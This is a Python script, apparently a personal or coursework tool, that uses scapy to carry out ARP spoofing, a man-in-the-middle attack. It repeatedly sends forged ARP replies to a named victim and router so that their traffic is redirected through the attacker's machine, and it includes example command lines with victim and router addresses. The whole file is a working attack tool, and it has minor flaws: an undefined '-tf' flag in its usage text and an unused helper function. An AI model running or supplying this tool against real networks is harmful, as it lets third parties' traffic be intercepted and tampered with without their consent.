from sys import api_version
import argparse
import textwrap
import time
from scapy.all import *
"""
    ARP poison tool using scapy and argpars
"""

# class of the ARP spoofing
class ARP_spoof():
    def __init__(self, args):
        self.args = args

    # stander function of sending ARP response
    def send_APR_response(self,pdst,hwdst,psrc,hwsrc):
        arp_response = ARP()
        arp_response.op = 2
        arp_response.pdst = pdst
        arp_response.hwdst = hwdst
        arp_response.psrc = psrc
        arp_response.hwsrc = hwsrc
        send(arp_response)

    # victim ARP poison
    def spoof_victim(self):
        self.send_APR_response(pdst=self.args.targetVictim,hwdst=self.args.macVictim,psrc=self.args.targetRouter,hwsrc=self.args.macHacker)
    
    # router ARP poison
    def spoof_router(self):
        self.send_APR_response(pdst=self.args.targetRouter, hwdst=self.args.macRouter, psrc=self.args.targetVictim, hwsrc=self.args.macHacker)

    # restore the ARP tables of the victim and the router 
    def restore(self):
        self.send_APR_response(pdst=self.args.targetVictim, hwdst=self.args.macVictim, psrc=self.args.targetRouter, hwsrc=self.args.macRouter)

        self.send_APR_response(pdst=self.args.targetRouter, hwdst=self.args.macRouter, psrc=self.args.targetVictim, hwsrc=self.args.macVictim)

    # run the ARP poison in loop every 5s
    # exist by ctrl+c: restore the ARP tables of victim and the router
    def run(self):
        try:
            while True:
                self.spoof_victim()
                self.spoof_router()
                time.sleep(5)
        except KeyboardInterrupt as err:
            print("restoring ARP tables")
            self.restore()
            print("exiting")
            sys.exit(-1)

# function: change IP address in the LAN field of the victim network 
def getFogerIPAddress(ipAddress):
    txt = ipAddress.split('.',4)
    txt[3] = '244'
    return '.'.join(txt)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
                prog="ARP_Spoofing",
                description="ARP spoofing code: MITM attacke",
                formatter_class=argparse.RawDescriptionHelpFormatter,
                epilog=textwrap.dedent('''Example:
        ARP_Spoofing.py -mh 00:0C:29:90:79:02 -mv 00:0C:29:BE:47:14 -tv 192.168.74.129 -mr 00:50:56:FF:74:8B -tr 192.168.74.2
        ARP_Spoofing.py -mh 00:0C:29:90:79:02 -tf 192.168.74.15 -mv 00:0C:29:BE:47:14 -tv 192.168.74.129 -mr 00:50:56:FF:74:8B -tr 192.168.74.2'''))

    parser.add_argument('-mh','--macHacker',required=True,help='MAC address of the hacher machine')

    parser.add_argument('-mv', '--macVictim',help='MAC address of the victim machine')
    parser.add_argument('-tv', '--targetVictim',help='IP address of the victim machine',required=True)

    parser.add_argument('-mr','--macRouter', help='MAC address of the router')
    parser.add_argument('-tr','--targetRouter',required=True,help='IP address of the router')

    args = parser.parse_args()

    print("macHacker: ",args.macHacker)
    print("macVictim: ",args.macVictim)
    print("targetVictim: ",args.targetVictim)
    print("macRouter: ",args.macRouter)
    print("targetRouter: ",args.targetRouter)

    arp_Spoof = ARP_spoof(args=args)
    arp_Spoof.run()

